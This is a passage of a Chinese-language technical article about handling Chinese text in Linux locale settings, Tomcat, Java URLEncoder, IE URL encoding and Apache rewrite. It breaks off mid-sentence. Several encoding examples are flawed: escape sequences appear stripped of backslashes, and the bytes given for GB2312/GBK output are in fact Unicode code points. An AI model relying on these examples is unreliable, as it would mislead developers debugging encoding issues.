<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　这里所说的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">linux</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">默认编码，是指运行时的环境变量。两个重要的环境变量是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">LC_ALL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">LANG</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，默认编码会影响到</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java URLEncode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的行为，下面有描述。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　建议都设置为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"zh_CN.UTF-8"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">4.4. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">其它</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　为了支持中文文件名，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">linux</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">在加载磁盘时应该指定字符集，例如：</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">mount /dev/hda5 /mnt/hda5/ -t ntfs -o iocharset=gb2312</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　另外，如前所述，使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GET</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法提交的信息不支持</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">request.setCharacterEncoding()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，但可以通过</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">tomcat</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的配置文件指定字符集，在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">tomcat</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">server.xml</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件中，形如：。这种方法将统一设置所有请求，而不能针对具体页面进行设置，也不一定和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">browser</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">使用的编码相同，所以有时候并不是所期望的。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">5. URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">地址</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">地址中含有中文字符是很麻烦的，前面描述过使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GET</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法提交表单的情况，使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GET</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法时，参数就是包含在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">5.1. URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中的一些特殊字符，浏览器会自动进行编码。这些字符除了</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"/?&amp;"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">等外，还包括</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">字符，比如汉子。这时的编码比较特殊。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">IE</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">有一个选项</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">总是使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">发送</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，当该选项有效时，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">IE</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">将会对特殊字符进行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，同时进行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码。如果改选项无效，则使用默认编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"GBK"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，并且不进行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码。但是，对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">后面的参数，则总是不进行编码，相当于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">选项无效。比如</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">.html?a=</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，当</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">选项有效时，将发送链接</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"%e4%b8%ad%e6%96%87.html?a=x4ex2dx65x87";</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">而</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">选项无效时，将发送链接</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"x4ex2dx65x87.html?a=x4ex2dx65x87"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。注意后者前面的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个字只有</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">4</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">个字节，而前者却有</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">18</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">个字节，这主要时</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码的原因。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　当</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">web server(tomcat)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">接收到该链接时，将会进行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">解码，即去掉</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"%"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，同时按照</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">ISO8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">上面已经描述，可以使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URLEncoding</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">来设置成其它编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">识别。上述例子的结果分别是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"ue4ub8uadue6u96u87.html?a=u4eu2du65u87"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"u4eu2du65u87.html?a=u4eu2du65u87"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，注意前者前面的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个字恢复成了</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">6</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">个字符。这里用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"u"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，表示是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　所以，由于客户端设置的不同，相同的链接，在服务器上得到了不同结果。这个问题不少人都遇到，却没有很好的解决办法。所以有的网站会建议用户尝试关闭</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">选项。不过，下面会描述一个更好的处理办法。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">5.2. rewrite</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　熟悉的人都知道，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">apache</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">有一个功能强大的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">rewrite</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">模块，这里不描述其功能。需要说明的是该模块会自动将</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">解码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">去除</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">%)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，即完成上述</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">web server(tomcat)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的部分功能。有相关文档介绍说可以使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">[NE]</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">参数来关闭该功能，但我试验并未成功，可能是因为版本</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">我使用的是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">apache 2.0.54)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">问题。另外，当参数中含有</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"?&amp; "</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">等符号的时候，该功能将导致系统得不到正常结果。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">rewrite</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">本身似乎完全是采用字节处理的方式，而不考虑字符串的编码，所以不会带来编码问题。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">5.3. URLEncode.encode()</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　这是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">Java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">本身提供对的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码函数，完成的工作和上述</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">选项有效时浏览器所做的工作相似。值得说明的是，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">已经不赞成不指定编码来使用该方法</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(deprecated)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。应该在使用的时候增加编码指定。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　当不指定编码的时候，该方法使用系统默认编码，这会导致软件运行结果得不确定。比如对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，当系统默认编码为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"gb2312"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">时，结果是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"%4e%2d%65%87"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，而默认编码为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"UTF-8"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，结果却是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"%e4%b8%ad%e6%96%87"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，后续程序将难以处理。另外，这儿说的系统默认编码是由运行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">tomcat</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">时的环境变量</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">LC_ALL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">LANG</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">等决定的，曾经出现过</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">tomcat</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">重启后就出现乱码的问题，最后才郁闷的发现是因为修改修改了这两个环境变量。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　建议统一指定为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"UTF-8"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，可能需要修改相应的程序。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">5.4. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">一个解决方案</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　上面说起过，因为浏览器设置的不同，对于同一个链接，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">web server</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">收到的是不同内容，而软件系统有无法知道这中间的区别，所以这一协议目前还存在缺陷。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　针对具体问题，不应该侥幸认为所有客户的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">IE</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">设置都是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">有效的，也不应该粗暴的建议用户修改</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">IE</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">设置，要知道，用户不可能去记住每一个</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">web server</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; 